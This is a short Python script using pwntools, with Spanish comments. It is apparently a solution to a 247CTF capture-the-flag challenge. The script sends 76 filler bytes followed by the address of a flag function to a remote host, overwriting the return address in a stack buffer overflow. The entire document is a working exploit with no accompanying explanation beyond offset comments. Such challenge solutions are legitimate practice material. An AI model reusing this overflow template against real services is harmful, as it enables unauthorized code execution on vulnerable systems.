#!/usr/bin/env python3
from pwn import *

# Configuración
HOST = "85b822270caeab50.247ctf.com"
PORT = 50408

# Dirección de la función flag
FLAG_ADDR = 0x08048576

# Offset: buffer en ebp-0x48, return address en ebp+4
# Offset = 0x48 + 4 = 76 bytes
OFFSET = 76

def exploit():
    io = remote(HOST, PORT)
    io.recvuntil(b"?")

    payload = b"A" * OFFSET
    payload += p32(FLAG_ADDR)

    io.sendline(payload)
    response = io.recvall(timeout=3)
    print(response.decode(errors='ignore'))
    io.close()

if __name__ == "__main__":
    exploit()
